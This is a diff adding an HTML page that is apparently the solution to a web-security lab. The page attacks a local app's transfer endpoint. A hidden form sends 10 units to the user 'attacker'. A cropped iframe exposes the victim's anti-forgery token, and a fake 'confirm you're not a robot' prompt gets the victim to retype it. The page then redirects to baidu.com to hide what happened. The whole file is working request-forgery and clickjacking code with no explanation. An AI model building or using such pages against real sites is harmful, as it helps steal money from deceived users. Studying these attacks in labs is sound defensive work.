@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <style type="text/css">
+        .wrp { width:300px; height:20px; margin:10px 30px; overflow:hidden; position:relative; }
+        .if { width:1024px; height:768px; position:absolute; top:-575px; left:-130px; }
+    </style>
+</head>
+<body>
+
+<form action="http://localhost:3000/super_secure_post_transfer"
+      method="post" enctype="application/x-www-form-urlencoded" id="pay">
+    <input type="hidden" name="destination_username" value="attacker">
+    <input type="hidden" name="quantity" value=10>
+    <label>
+        Please repeat the string to confirm that you're not a robot:<br>
+        <input type="text" name="tokeninput" value="">
+    </label>
+</form>
+<button onclick="buttonSubmit()">Submit</button>
+<br>
+<div class="wrp">
+    <iframe class="if" src="http://localhost:3000/super_secure_transfer" scrolling="no" sandbox="" id="if1"></iframe>
+</div>
+
+
+<script type="text/javascript">
+    const buttonSubmit = () => {
+        document.getElementById("pay").submit();
+        window.location = "https://baidu.com";
+    };
+</script>
+
+</body>
+</html>
